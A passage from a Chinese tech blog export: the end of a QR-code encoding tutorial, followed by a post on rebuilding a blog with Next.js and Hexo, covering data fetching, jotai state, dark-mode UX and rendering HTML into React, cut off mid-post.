如果你以为我们可以开始画图，你就错了。二维码的混乱技术还没有玩完，它还要把数据码和纠错码的各个codewords交替放在一起。如何交替呢，规则如下： 对于数据码：把每个块的第一个codewords先拿出来按顺度排列好，然后再取第一块的第二个，如此类推。如：上述示例中的Data Codewords如下： 块 167857013487388519411950618610338块 224624666711813424273886221981991466块 31822302471195071181348738826134151507块 4702471188619461515016236172361723617236 我们先取第一列的：67， 246， 182， 70 然后再取第二列的：67， 246， 182， 70， 85，246，230 ，247 如此类推：67， 246， 182， 70， 85，246，230 ，247 ……… ……… ，38，6，50，17，7，236 对于纠错码，也是一样： 块 121319911451152472412232292481541171541118616111139块 28720496602021821241572001342712920917163163120133块 314811617721276133752422387619523018910108240192141块 423515951732414759331064025517282213132178236 和数据码取的一样，得到：213，87，148，235，199，204，116，159，…… …… 39，133，141，236 然后，再把这两组放在一起（纠错码放在数据码之后）得到： 67, 246, 182, 70, 85, 246, 230, 247, 70, 66, 247, 118, 134, 7, 119, 86, 87, 118, 50, 194, 38, 134, 7, 6, 85, 242, 118, 151, 194, 7, 134, 50, 119, 38, 87, 16, 50, 86, 38, 236, 6, 22, 82, 17, 18, 198, 6, 236, 6, 199, 134, 17, 103, 146, 151, 236, 38, 6, 50, 17, 7, 236, 213, 87, 148, 235, 199, 204, 116, 159, 11, 96, 177, 5, 45, 60, 212, 173, 115, 202, 76, 24, 247, 182, 133, 147, 241, 124, 75, 59, 223, 157, 242, 33, 229, 200, 238, 106, 248, 134, 76, 40, 154, 27, 195, 255, 117, 129, 230, 172, 154, 209, 189, 82, 111, 17, 10, 2, 86, 163, 108, 131, 161, 163, 240, 32, 111, 120, 192, 178, 39, 133, 141, 236 这就是我们的数据区。 ※Remainder Bits 最后再加上Reminder Bits，对于某些Version的QR，上面的还不够长度，还要加上Remainder Bits，比如：上述的5Q版的二维码，还要加上7个bits，Remainder Bits加零就好了。关于哪些Version需要多少个Remainder bit，可以参看QR Code Spec的第15页的Table-1的定义表。 ※画二维码图 ※Position Detection Pattern 首先，先把Position Detection图案画在三个角上。（无论Version如何，这个图案的尺寸就是这么大） ※Alignment Pattern 然后，再把Alignment图案画上（无论Version如何，这个图案的尺寸就是这么大） 关于Alignment的位置，可以查看QR Code Spec的第81页的Table-E.1的定义表（下表是不完全表格） 下图是根据上述表格中的Version8的一个例子（6，24，42） ※Timing Pattern 接下来是Timing Pattern的线（这个不用多说了） ※Format Information 再接下来是Formation Information，下图中的蓝色部分。 Format Information是一个15个bits的信息，每一个bit的位置如下图所示：（注意图中的Dark Module，那是永远出现的） 这15个bits中包括： 5个数据bits：其中，2个bits用于表示使用什么样的Error Correction Level， 3个bits表示使用什么样的Mask 10个纠错bits。主要通过BCH Code来计算 然后15个bits还要与101010000010010做XOR操作。这样就保证不会因为我们选用了00的纠错级别和000的Mask，从而造成全部为白色，这会增加我们的扫描器的图像识别的困难。 下面是一个示例： 关于Error Correction Level如下表所示： 关于Mask图案如后面的Table 23所示。 ※Version Information 再接下来是Version Information（版本7以后需要这个编码），下图中的蓝色部分。 Version Information一共是18个bits，其中包括6个bits的版本号以及12个bits的纠错码，下面是一个示例： 而其填充位置如下： ※数据和数据纠错码 然后是填接我们的最终编码，最终编码的填充方式如下：从左下角开始沿着红线填我们的各个bits，1是黑色，0是白色。如果遇到了上面的非数据区，则绕开或跳过。 ※掩码图案 这样下来，我们的图就填好了，但是，也许那些点并不均衡，如果出现大面积的空白或黑块，会告诉我们扫描识别的困难。所以，我们还要做Masking操作（靠，还嫌不复杂）QR的Spec中说了，QR有8个Mask你可以使用，如下所示：其中，各个mask的公式在各个图下面。所谓mask，说白了，就是和上面生成的图做XOR操作。Mask只会和数据区进行XOR，不会影响功能区。（注：选择一个合适的Mask也是有算法的） 其Mask的标识码如下所示：（其中的i,j分别对应于上图的x,y） 下面是Mask后的一些样子，我们可以看到被某些Mask XOR了的数据变得比较零散了。 Mask过后的二维码就成最终的图了。 好了，大家可以去尝试去写一下QR的编码程序，当然，你可以用网上找个Reed Soloman的纠错算法的库，或是看看别人的源代码是怎么实现这个繁锁的编码。 （全文完）","tags":"二维码"},{"title":"使用 Next.js + Hexo 重构我的博客","url":"/20240711/shi-yong-next-js-hexo-chong-gou-wo-de-bo-ke/","text":"转载自 使用 Next.js + Hexo 重构我的博客 在咕咕了一整年、只发布了三篇文章（其中两篇还是译文）之后，我决定还是稍微花一点时间好好折腾一下自己的博客，以 React 作为抓手，通过 Next.js 和 Hexo 深度共建，对标 Gatsby，打通静态 HTML 与用户交互之间的垂直领域屏障，实现多维矩阵闭环，为个人博客赋能（咳咳咳），然后水出 2022 年第一篇文章（逃） ※技术选型：Gatsby vs Next.js 我使用 Hexo 驱动博客已经三年之久了，之前写过一个 开源的 Hexo 主题，后来还成为了 Hexo 的 Core Team Member、为 Hexo 贡献了不少代码。 Hexo 是一个诞生于 2012 年的、由 Node.js 驱动的静态站点生成器（Static Site Generator），对标 Jekyll 和 Octopress；受限制于其时代背景、Hexo 只是一个基于模板拼接静态字符串的工具。在构建更强大、更现代的网站时，Hexo 并不能提供太多帮助。 在选择框架的时候，我希望选择的框架能够实现以下功能： 静态导出：静态页面无需后端，易于部署和缓存 无刷新页面导航：不仅仅是 PJAX 的刷新不重载，我希望页面切换时，只需要加载新页面需要但尚未加载的资源（即复用现有的资源），同时浏览器能够差分更新 DOM、节省不必要的重复渲染开销。 页面预载：我希望网站内链接可以在 进入用户 Viewport / 用户 Mouseover 时能够预加载，配合无刷新站内导航实现接近 Native 级别的页面切换性能。由于我的技术栈不包括 Vue，因此 Nuxt.js、VuePress 和 VitePress 率先出局；常见 React 元框架（The Framework of Framework a.k.a Meta Framework）包括 Remix、Gatsby 和 Next.js。其中 Remix 依赖 Serverless 平台、不支持静态导出和 optimistic 缓存，也一并出局。 关于 Gatsby 和 Next.js 之间的对比和区别，相关讨论数不胜数、无需赘述。对我来说，两者最重要的区别是 Gatsby 的 Data Source 必须是 GraphQL Based Query，而 Next.js 的 Data Source 是任意的：开发者只需要在 pages 中命名导出 getStaticProps、getServerSideProps、getStaticPaths、getInitialProps 供 Next.js 在构建时调用，Next.js 本身并不关心数据来源是 GraphQL 还是 RESTful，亦或者是本地文件系统。因此，我可以继续使用 Hexo 作为我的 Content Management System、管理文章数据，让 Next.js（React）专注于 UI/UX 的构建上。 ※内容管理：从 Hexo 到 Next.js 从 Hexo 获取数据 Hexo 的核心是一个 JSON based NoSQL 数据库 warehouse。除了可以通过 CLI 调用以外，Hexo 还暴露了一系列 JS API，直接操作 warehouse 来对文章数据 CRUD。 首先初始化 Hexo 实例： 123456789101112131415161718192021import Hexo from &#x27;hexo&#x27;;let __SECRET_HEXO_INSTANCE__: Hexo | null = null;const initHexo = async () =&gt; &#123; // 复用已初始化的 Hexo 实例 if (__SECRET_HEXO_INSTANCE__) &#123; return __SECRET_HEXO_INSTANCE__; &#125; // 使用指定参数实例化一个 Hexo 实例 const hexo = new Hexo(process.cwd(), &#123; silent: true, &#125;); // 初始化 Hexo 实例（加载插件、加载配置文件） await hexo.init(); // 载入 Hexo 目录（文章、草稿、站点数据、主题） await hexo.load(); __SECRET_HEXO_INSTANCE__ = hexo; return hexo;&#125;; 初始化 Hexo 实例以后，即可从 Hexo 中获取数据了： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051import &#123; basename &#125; from &#x27;path&#x27;;import &#123; url_for &#125; from &#x27;hexo-util&#x27;;// 获取所有文章的路径，供 Next.js 的 getStaticPaths 构建路径索引时使用export const async fetchAllPostsPaths = () =&gt; &#123; const hexo = await initHexo(); const posts = hexo.database.model(&#x27;Post&#x27;).find(&#123;&#125;).sort(&#x27;-date&#x27;); return posts.map(post =&gt; basename(post.slug));&#125;// 获取指定文章的数据，供 Next.js 的 getStaticProps 使用export const findPostBySlug = async (slug: string) =&gt; &#123; const hexo = await initHexo(); const urlFor = url_for.bind(hexo); const post = hexo.database.model(&#x27;Post&#x27;).findOne(&#123; path: `post/$&#123;slug&#125;/` &#125;); // 只返回需要用到的 prop return &#123; title: post.title; date: post.date; updated: post.updated; content: post.content; permalink: post.permalink; prev: post.prev ? &#123; title: post.prev.title ?? &#x27;&#x27;, url: urlFor(post.prev.path) &#125; : null, next: post.next ? &#123; title: post.next.title ?? &#x27;&#x27;, url: urlFor(post.next.path) &#125; : null, &#125;&#125;;export const getStaticPaths = async () =&gt; &#123; const paths = await fetchAllPostsPaths(); return &#123; paths, fallback: false, &#125;;&#125;;export const getStaticProps = async (&#123; params &#125;) =&gt; &#123; const post = await findPostBySlug(params.slug); return &#123; props: &#123; post &#125; &#125;&#125; 如果需要返回所有包含指定标签的文章，通过构建 query 索引 Hexo 数据库即可： 123456789export const getPostsFromTag =&gt; async (tag: string) =&gt; &#123; const hexo = await initHexo(); // 根据标签的 name 在数据库中寻找对应的 Tag 对象 const tag = hexo.database.model(&#x27;Tag&#x27;).findOne(&#123; name: tag &#125;, &#123; lean: true &#125;)); // 在 Post - Tag 交叉索引数据库中寻找所有包含当前 Tag 的 _id 的文章 const postIds = hexo.database.model(&#x27;PostTag&#x27;).find(&#123; tag_id: tag._id &#125;).map(item =&gt; item.post_id); // 利用 $in query 寻找 postIds 中的所有文章、并按照日期排序 const posts = hexo.database.model(&#x27;Post&#x27;).find(&#123; _id: &#123; $in: postIds &#125; &#125;).sort(&#x27;-date&#x27;);&#125;; 在构建文章列表的时候，需要生成一个形状类似于 { posts: Post[], path: string, index: number, prev: { path: string, index: number }, next: { path: string, index: number } }[] 分页数组，也可以使用 Hexo 的插件： 12345import hexoIndexGenerator from &#x27;hexo-generator-index/lib/generator&#x27;;export const buildIndexPaginations = async () =&gt; &#123; const hexo = await initHexo(); const data = hexoIndexGenerator.call(hexo, hexo.locals.toObject());&#125;; ※Next.js 多线程与 Hexo 数据持久化 为了加快构建速度，Next.js 默认使用 worker_thread 进行多线程构建，其中 getStaticProps、getStaticPaths 等函数都会在不同的线程中运行。Next.js 并没有实现线程间共享数据的 API，目前官方推荐的做法是将需要共享的数据写入文件系统进行缓存。而 Hexo 也内置了基于文件系统（db.json）的数据持久化接口 database.save()。我们可以在首次初始化 Hexo 实例、从本地 Hexo 目录加载数据后将 db.json 写入文件系统，后续 Next.js 其余线程再次创建 Hexo 实例时，Hexo 会自动优先从 db.json 获取数据、不再扫描本地目录。 1234567891011121314151617181920212223242526272829303132const initHexo = async () =&gt; &#123; if (__SECRET_HEXO_INSTANCE__) &#123; return __SECRET_HEXO_INSTANCE__; &#125; const hexo = new Hexo(process.cwd(), &#123; silent: true, &#125;); const dbPath = join(hexo.base_dir, &#x27;db.json&#x27;); if (process.env.NODE_ENV !== &#x27;production&#x27;) &#123; // 当 不属于生产构建、且本地存在 db.json 时，删除 db.json、确保开发时可以预览实时最新的数据 if (fs.existsSync(dbPath)) &#123; await fs.promises.unlink(dbPath); &#125; &#125; await hexo.init(); await hexo.load(); if (hexo.env.init &amp;&amp; hexo._dbLoaded) &#123; if (!fs.existsSync(dbPath)) &#123; // 只有在本地不存在 db.json、且在生产构建时，将数据库写入文件系统 if (process.env.NODE_ENV === &#x27;production&#x27;) &#123; await hexo.database.save(); &#125; &#125; &#125; __SECRET_HEXO_INSTANCE__ = hexo; return hexo;&#125;; ※本地预览 Hexo 草稿 Hexo 支持 草稿写作 功能：正常构建时默认忽略草稿，只包括「已发布」的文章。在本地预览草稿时，通过 CLI 的 --draft 参数即可将草稿包含在构建当中。draft 参数也可以在实例化 Hexo 时传入： 12345678910111213141516171819202122232425262728293031const initHexo = async () =&gt; &#123; if (__SECRET_HEXO_INSTANCE__) &#123; return __SECRET_HEXO_INSTANCE__; &#125; const hexo = new Hexo(process.cwd(), &#123; silent: true, // 在 next dev 时包含草稿 draft: process.env.NODE_ENV !== &#x27;production&#x27; &#125;); const dbPath = join(hexo.base_dir, &#x27;db.json&#x27;); if (process.env.NODE_ENV !== &#x27;production&#x27;) &#123; if (fs.existsSync(dbPath)) &#123; await fs.promises.unlink(dbPath); &#125; &#125; await hexo.init(); await hexo.load(); if (hexo.env.init &amp;&amp; hexo._dbLoaded) &#123; if (!fs.existsSync(dbPath)) &#123; if (process.env.NODE_ENV === &#x27;production&#x27;) &#123; await hexo.database.save(); &#125; &#125; &#125; __SECRET_HEXO_INSTANCE__ = hexo; return hexo;&#125;; 使用 Hexo 为 Next.js 添加 RSS 和 Sitemap Next.js 并没有内置 RSS 和 Sitemap 支持。不过由于我的内容是通过 Hexo 管理，因此可以通过 Hexo 的 API 和 Hexo 的插件生成 RSS 和 Sitemap： 123456789101112131415import &#123; promises as fsPromise &#125; from &#x27;fs&#x27;;import feedGenerator from &#x27;hexo-feed-generator/lib/generator&#x27;;import betterSitemapGenerator from &#x27;hexo-generator-better-sitemap/lib/generator&#x27;;const hexo = await initHexo();const atom1 = feedGenerator.call(hexo, hexo.locals.toObject(), &#x27;atom&#x27;, &#x27;atom.xml&#x27;);const rss2 = feedGenerator.call(hexo, hexo.locals.toObject(), &#x27;rss&#x27;, &#x27;rss.xml&#x27;);const sitemaps = betterSitemapGenerator.call(hexo, hexo.locals.toObject());await Promise.all( [atom, rss2, ...sitemaps].map( async (&#123; data, path &#125;) =&gt; fsPromises.writeFile(path, data, &#x27;utf8&#x27;) )); ※Atomic CSS-in-JS：style9 当「关注点分离」还是主流思想时，传统大型项目使用的 CSS 方法论如 BEM、OOCSS 都曾大行其道，Bootstrap、Foundation、Bulma 等 CSS Framework 便是这种潮流下的产物。而最近，Utility First 的 CSS 概念脱颖而出、逐渐受到社区的关注，其中最典型的便是 Tailwind CSS，通过复用 Utility 规则、以及在编译时只包含用到的 CSS、使得最终 CSS 产物大幅减小。 在 Utility First 上更进一步，就到了 Atomic CSS。在 Atomic CSS 中，每一个 CSS 类都只有一条独立的 CSS 规则。相比于传统 CSS 方法论、CSS 产物大小与项目的复杂程度和组件数量线性正相关；而使用了 Utility First 或 Atomic CSS 以后，随着组件数量逐渐增加、能复用的 CSS 规则越来越多、最终 CSS 产物大小与项目复杂程度呈对数关系： Atomic CSS-in-JS 实现有运行时（Runtime）和预编译（Pre-Compile）两种。运行时实现的优势在于可以动态生成样式，更易于组合样式；缺点在于 Vendor Prefix 等处理需要在 Runtime 时执行、Bundle 中必须携带相关依赖、体积难免变大，典型的库有 Uber 的 Styletron（驱动了 Uber 的官网和 H5）和沃尔沃汽车前技术主管的 Fela（驱动了沃尔沃汽车官网，Cloudflare Dashboard 和 Medium）。预编译实现的优势在于无需将 Vendor Prefixer 等依赖打包 ship 给客户端，改善了性能；缺点在于难以实现动态样式组合（高度依赖对代码的静态分析），典型的库有 Atlassian 的 Compiled CSS-in-JS 和 Facebook 尚未开源的 StyleX。 在使用 Atomic CSS 重写博客之前，我需要 ship 25.2 KiB 的 CSS 才能在浏览器中达成首次渲染（First Paint）、之后还需要异步 ship 非关键 CSS；在使用 Atomic CSS 重写以后，我只需要 17.5 KiB 的 CSS 就能够覆盖博客所有页面的样式。 关于 CSS-in-JS 和 Atomic CSS-in-JS，我计划会专门写一篇文章介绍。 ※原子化状态管理：jotai React 的哲学是「The Data Flows Down」，即「单向数据流」。状态（State）属于组件，而一个组件的状态只能影响其「子组件」。简单地，React 组件的状态是单向往下的，子组件需要修改父组件的状态，必须通过状态提升（即子组件必须是「受控」的）；多个组件需要共享一个状态时，需要将状态提升到公共父组件。 当 React Tree 越来越深时，逐级向上提升状态也会越来越繁琐： 1234567891011121314151617181920212223242526272829303132const IncrementButton = (props: &#123; onClick: () =&gt; void &#125;) =&gt; (&lt;button onClick=&#123;props.onClick&#125;&gt;+&lt;/button&gt;);const DecrementButton = (props: &#123; onClick: () =&gt; void &#125;) =&gt; (&lt;button onClick=&#123;props.onClick&#125;&gt;-&lt;/button&gt;);const Control = (props: &#123; value: number, onChange: (value: number) =&gt; void &#125;) =&gt; &#123; const handleInputChange = (event: React.InputEvent&lt;HTMLInputElement&gt;) =&gt; props.onChange(Number(event.currentTarget.value)); const handleIncrement = () =&gt; props.onChange(props.value + 1); const handleDecrement = () =&gt; props.onChange(props.value - 1); return ( &lt;Box&gt; &lt;IncrementButton onClick=&#123;handleIncrement&#125; /&gt; &lt;DecrementButton onClick=&#123;handleDecrement&#125; /&gt; &lt;/Box&gt; )&#125;;const Count = (props: &#123; value: number &#125;) =&gt; (&lt;div&gt;&#123;props.value&#125;&lt;/div&gt;);const Counter = () =&gt; &#123; const [count, setCount] = useState(0); const handleChange = (value) =&gt; &#123; if (Number.isInteger(value)) setCount(value); &#125;; return ( &lt;div&gt; &lt;Count value=&#123;count&#125; /&gt; &lt;Control value=&#123;count&#125; onChange=&#123;handleChange&#125; /&gt; &lt;/div&gt; );&#125;; 以如上的计数组件为例，为了能在 组件中展示计数、由 组件控制计数，我们不得不将状态提升到公共父组件 中；而 和 需要通过 props.onClick 将状态提升到 中；而 组件又需要通过 props.onChange 将状态提升到 中；为了实现数字递增和递减，我们将状态 count 通过 value prop 分别传递给了 、又通过 handleIncrement 和 handleDecrement 传染到了 和 ，导致整个组件的每一个子组件都会随着 value 改变而重新渲染、无法被 memo 优化。 当然，通过 useReducer 将递增和递减改为 reducer 中的 increment 和 decrement 两个 action，然后只需要将不变的 dispatcher 通过 prop 向下传给 ，使得 和 可被包裹在 memo 中，从而优化整个组件。是否有更加直观的状态管理和传递方式呢？ jotai 是 Daishi Kato 开发的一个「原始、灵活」的、基于原子的 React 状态管理库，在 React Tree 中任意位置的组件都能通过 useAtom Hook 共享一个 atom 的状态、且 API 和 React 的 useState 非常相似，不仅改善开发体验、还降低了学习成本。和 React Context 一改变、所有子组件都要更新不同，只有 subscribe 了 jotai atom 的组件会在 atom 更新时重新渲染。除此以外，jotai 还通过 useReducer 分离状态更新与组件更新，避免了更多潜在的额外渲染（参见 React Hook Cheat Mode）。除此以外，jotai 还提供了对 derived state 和 derived async state 的支持。 nanostores 是由 PostCSS 作者开发的另一个基于原子的、可用于 React、Vue、Angular、Vanilla、Solid。和 jotai 原理相同，nanostores 也是由外部管理状态；相比 jotai（gzip 后 7KiB 左右），nanostores 更加轻便（gzip 后大小不过 199 Byte），但是并没有针对 React 优化、不能避免潜在的额外渲染。 使用 jotai 重写上述计数组件： 1234567891011121314151617181920212223242526272829303132333435363738const count = atom(0);const IncrementButton = () =&gt; &#123; const [, setCount] = useAtom(count); return ( &lt;button onClick=&#123;() =&gt; setCount(count =&gt; count + 1)&#125;&gt;+&lt;/button&gt; );&#125;;const DecrementButton = () =&gt; &#123; const [, setCount] = useAtom(count); return ( &lt;button onClick=&#123;() =&gt; setCount(count =&gt; count - 1)&#125;&gt;+&lt;/button&gt; );&#125;;const Control = () =&gt; &#123; return ( &lt;Box&gt; &lt;IncrementButton /&gt; &lt;DecrementButton /&gt; &lt;/Box&gt; )&#125;;const Count = () =&gt; &#123; const [count] = useAtom(count); return (&lt;div&gt;&#123;count&#125;&lt;/div&gt;)&#125;;const Counter = () =&gt; &#123; return ( &lt;div&gt; &lt;Count /&gt; &lt;Control /&gt; &lt;/div&gt; );&#125;; 使用 jotai 在 React 外部管理状态 count，现在所有组件都不再通过 prop 向下传递数据、通过 prop 回调提升状态，我们成功去掉了所有组件的 prop；因此，整个 都可以被包裹在 memo 中；而 jotai 会保证在 count 更新时、只重新渲染 。 在我的博客中，我使用 jotai 来处理 React Tree 的不同深度的组件之间共享状态，例如在 Root - Navbar - DarkModeDropDown 和 Root - NextHead 中共享深色模式的状态；用 Root - Fab - FabToC 控制 Root - Left Cols - ToC 的 Modal 组件在移动端是否显示。 ※为网站添加用户友好的深色模式支持 新的深色模式 UX 过去，我在 「你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持」一文之中介绍了什么是深色模式，一些常见的实现深色模式的方法，以及我的博客当时是如何实现深色模式的。简而言之，当时我的博客的深色模式开关需要解决的问题是： 用户可以通过开关手动切换显示模式网站也可以通过 Media Query、跟随用户系统的偏好设置来自动切换模式如果用户手动切换模式、且网站将用户的选择永远记录在 localStorage 之中，那么用户将来就只能通过手动切换模式、不再能跟随操作系统的偏好设置自动切换绝大部分国内网站的深色模式的 UX 体验就是如此差劲：例如，V2EX 的深色模式必须通过手动切换、不能跟随操作系统的偏好设置自动切换；新浪微博的深色模式只有用户从未手动切换过模式时能够跟随操作系统的偏好设置自动切换，一旦用户手动切换深色模式、那么就不能再跟随操作系统的偏好设置自动切换。 因此，当时我的博客的解决方案是： 当网站跟随操作系统的偏好设置、处于浅色模式下时，用户通过点击按钮切换到深色模式当操作系统的偏好设置也为深色模式时，网站自动忘记 localStorage 中记录的模式、恢复跟随操作系统偏好设置自动切换因此当操作系统的偏好设置恢复浅色模式后，网站会自动恢复浅色模式反之亦然：当网站处于深色模式下时，用户可以手动切换到浅色模式；而当用户的操作系统偏好浅色模式时，网站也会恢复到自动切换模式简而言之，当网站记忆的用户的手动模式与操作系统的偏好设置一致时，网站会忘记用户设置的手动模式、恢复自动模式虽然解决了用户手动设置后不能恢复自动切换，但是这个方案的 UX 并不好： 当用户手动模式被忘记时，在 UI 上没有任何提示用户可能并不希望网页恢复到自动模式为了同时解决「能够在手动模式与自动模式间切换」和「给予用户更大自主权」的问题，我开始参考大部分网站的解决方案：深色模式下拉菜单的 UX 细节仔细观察深色模式下拉菜单的话，可以发现一个细节： darkmode-menu 当深色模式下拉菜单首次打开以后，当前生效的选项会高亮、字体加粗、使用强调色当光标移动时，当前光标悬浮的选项会高亮，当前生效选项的字体仍然加粗和使用强调色当光标离开菜单后，没有选项被高亮、当前生效选项的字体仍然加粗和使用强调色由于 DOM 没有光标悬浮事件，因此我们需要一个 state 配合 onMouseEnter 和 onMouseLeave 事件跟踪当前光标悬浮的选项，控制是否高亮；另外一个包含当前生效选项的 state，控制字体是否加粗和使用强调色。 123456789101112131415161718192021222324252627282930313233343536373839404142const darkModeItem = [ [&#x27;auto&#x27;, &#x27;跟随系统&#x27;], [&#x27;dark&#x27;, &#x27;总是深色&#x27;], [&#x27;light&#x27;, &#x27;总是浅色&#x27;]] as const;const DarkModeDropdownMenu = () =&gt; &#123; const [themeValue, setThemeValue] = useAtom(themeAtom); // 当前悬浮 state 的初始值取当前生效的选项 const [hovered, setHovered] = useState(themeValue); const handleClick = useCallback(value =&gt; () =&gt; &#123; setThemeValue(value); &#125;, [setThemeValue]); const handleMouseEnter = useCallback(key =&gt; () =&gt; &#123; setHovered(key); &#125;, []); const handleMouseLeave = useCallback(() =&gt; &#123; setHovered(null); &#125;, []); return ( &lt;div className=&#123;styles(&#x27;menuBody&#x27;)&#125;&gt; &#123; darkModeItem.map(([key, text]) =&gt; ( &lt;DropdownItem key=&#123;key&#125; // 当前生效的选项、控制 &lt;DropdownItem /&gt; 的字体 active=&#123;themeValue === key&#125; // 当前光标悬浮的选项、控制 &lt;DropdownItem /&gt; 的高亮 hovered=&#123;hovered === key&#125; onMouseEnter=&#123;handleMouseEnter(key)&#125; onMouseLeave=&#123;handleMouseLeave&#125; onClick=&#123;handleClick(key)&#125; &gt; &#123;text&#125; &lt;/DropdownItem&gt; )) &#125; &lt;/div&gt; )&#125; ※使用 React 为静态 Markdown 添加动态交互 当使用 Hexo 时，我只需要将 Markdown 编译为静态的 HTML，然后通过编写额外的 JS、调用 DOM 和 Web API 来为静态页面添加动态交互，比如使用 medium-zoom 库模仿 Medium 和知乎专栏的文中图片点击放大。使用 Next.js 以后，这些特性都需要用 React 实现，以最大化发挥 React 的特性和优势。 dangerouslySetInnerHTML 迁移到 React 的同时还要维持原有的行为，最简单的办法是通过 dangerouslySetInnerHTML 将生成的 HTML 直接插入到 DOM 中、然后在 React 的副作用（useEffect）中调用 Web API 和操作 DOM。举个例子，只通过 DOM 和 Web API 实现 Next.js 内部链接无刷新导航的实现： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121import &#123; useEffect, useRef &#125; from &#x27;react&#x27;;import &#123; useRouter &#125; from &#x27;next/router&#x27;;const shouldCatchLinks = ( event: MouseEvent, targetsList: HTMLAnchorElement[]): boolean =&gt; &#123; if ( // 不是左键点击，可能是在试图强制跳转 event.button !== 0 // 使用了修饰键，可能是在试图强制跳转 || event.altKey || event.ctrlKey || event.metaKey || event.shiftKey // 点击事件已经在别处被处理了 || event.defaultPrevented ) return false; const anchor = event.target; if (!(anchor instanceof HTMLAnchorElement)) return false; if (!targetsList.includes(anchor)) return false; // a[download] 应该由浏览器直接处理 if (anchor.hasAttribute(&#x27;download&#x27;) === true) return false; // 不存在 href 属性的链接不应该处理 if (anchor.hasAttribute(&#x27;href&#x27;) === false) return false; if (( // 链接不包含 target 属性 anchor.hasAttribute(&#x27;target&#x27;) === false // 在 IE 上，链接的 target 属性一定存在，但可能为 undefined、null 或空字符 || anchor.target == null || [&#x27;_self&#x27;, &#x27;&#x27;].includes(anchor.target) || (anchor.target === &#x27;_parent&#x27; // 链接的 target 是 _parent，但 parent 可能不存在 &amp;&amp; (!anchor.ownerDocument.defaultView.parent // 链接的 target 是 _parent，但 parent 和当前页面一致 || anchor.ownerDocument.defaultView.parent === anchor.ownerDocument.defaultView)) || (anchor.target === &#x27;_top&#x27; // 链接的 target 是 _top，但 top 可能不存在 &amp;&amp; (!anchor.ownerDocument.defaultView.top // 链接的 target 是 _top，但 top 和当前页面一致 || anchor.ownerDocument.defaultView.top === anchor.ownerDocument.defaultView)) ) === false) return false; // 目标链接和当前页面的 Protocol 不相同 if (anchor.protocol !== window.location.protocol) return false; // 目标链接和当前页面的 Host 不相同 if (anchor.host !== window.location.host) return false; // IE 会清除动态生成的链接的 host 属性。 // 除此以外，IE 会将默认端口（80、443）包含在链接的 host 属性中，但是在 window.location 中又不包含，如： // http://example.com 的 location.host 是 example.com，但是在链接中的 host 是 example.com:80 // 在这里我没有做处理，如果需要兼容 IE，需要动态生成一个链接进行判断： // const a = document.createElement(&#x27;a&#x27;); // a.href = window.location.href; // if (anchor.host !== a.host) return false; if ( anchor.hash !== &#x27;&#x27; &amp;&amp; ( // 页面路径和当前相同，可能只是 Hash 变化，不处理 anchor.pathname === window.location.pathname // 在 IE 上，动态生成的链接、且 href 属性只包含 Hash 的，pathname 属性为空字符串 || anchor.pathname === &#x27;&#x27; ) ) return false; return true;&#125;;const prefetched = new Set&lt;string&gt;();export const Content = (props: &#123; content: string &#125;) =&gt; &#123; const postContainerRef = useRef&lt;HTMLElement&gt;(null); const router = useRouter(); // 监听内链跳转是直接操作 DOM，因此需要视为 React 副作用 useEffect(() =&gt; &#123; if (postContainerRef.current) &#123; const aEls = [...postContainerRef.current.querySelectorAll(&#x27;a&#x27;)]; const handleClick = (e: MouseEvent) =&gt; &#123; if (shouldCatchLinks(e, aEls)) &#123; e.preventDefault(); router.push((e.target as HTMLAnchorElement).getAttribute(&#x27;href&#x27;)); &#125; &#125;; // prefetch on hover, just like &lt;Link prefetch=&#123;false&#125; /&gt; const handleMouseEnter = (e: MouseEvent) =&gt; &#123; if (shouldCatchLinks(e, aEls)) &#123; e.preventDefault(); const href = (e.target as HTMLAnchorElement).getAttribute(&#x27;href&#x27;); if (!prefetched.has(href)) &#123; prefetched.add(href); router.prefetch(href); &#125; &#125; &#125;; aEls.forEach(a =&gt; &#123; const href = a.getAttribute(&#x27;href&#x27;); if (href?.startsWith(&#x27;/&#x27;)) &#123; a.addEventListener(&#x27;click&#x27;, handleClick); a.addEventListener(&#x27;mouseenter&#x27;, handleMouseEnter); &#125; &#125;); return () =&gt; &#123; aEls.forEach(a =&gt; &#123; a.removeEventListener(&#x27;click&#x27;, handleClick); a.removeEventListener(&#x27;mouseenter&#x27;, handleMouseEnter); &#125;); &#125;; &#125; &#125;, [router]);&#125;; 显而易见的，这种实现非常 dirty、难以维护，且完全没有发挥出 React 的任何特性。 ※在浏览器中将 Markdown 或 HTML 运行时编译为 React 节点 为了解决类似的问题，React 社区推出了许多解决方案： react-markdown：在浏览器中将原始 Markdown 编译为 React Node HTML2React：在浏览器中将静态 HTML 字符串通过 document.createElement 和 innerHTML 生成 DOM、再将 DOM 转换为 React Node html-to-react：在浏览器中调用 htmlparser2 将静态 HTML 字符串转换为 AST，再将 AST 渲染为 React Node rehype-react：与 html-to-react 类似，在浏览器中先将静态 HTML 字符串转换为 Unified AST，再将 AST 渲染为 React Node @frontity/html2react：也是先使用 himalaya 库将 HTML 字符串转换为 AST、再将 AST 渲染为 React Node 上述解决方案都能够用 React 为静态的 HTML 字符串、Markdown 字符串赋能，但是都需要在运行时对 HTML、Markdown 进行 Parse 与 Render，不仅导致 bundle 体积变大，同时也给浏览器造成了一定的性能压力。如果要改善客户端的性能，至少需要将 Parse 静态 HTML 的环节交给服务端处理、让运行时只负责 Render，也就是预编译。MDX 就是这种思路的一个实现—— ※预编译 MDX 在 Next.js 中有两种使用 MDX 的方法： 将 MDX 作为 Next.js 的页面源文件处理，Next.js 会使用 next/mdx Webpack loader 编译将 MDX 通过外部编译器进行预编译、序列化后，将编译结果喂给 Next.js 的 getStaticProps，如 next-mdx-remote 和 mdx-bundler 上述两种方法都在服务端完成解析和编译环节，但是也有各自的缺陷： Next.js 内置的 MDX 将每一个 MDX 文件作为一个单独的页面处理，不能够自定义和复用内容之外的 Layout next-mdx-remote 和 mdx-bundler 将 MDX 预编译并序列化，在前端渲染时需要使用 eval、new Function 或 Reflect.construct ※在服务端预生成 HTML AST，在客户端将 HTML AST 渲染为 React 节点 之前在使用 Hexo 时，我已经将 PostHTML 作为 Markdown 静态编译为 HTML 后的 After Processor。因此，我最终采用的方法是将 PostHTML 的 AST 直接喂给 Next.js 的 getStaticProps。同时依照 posthtml-render 实现一个将 PostHTML AST 渲染为 React Node 的方法： 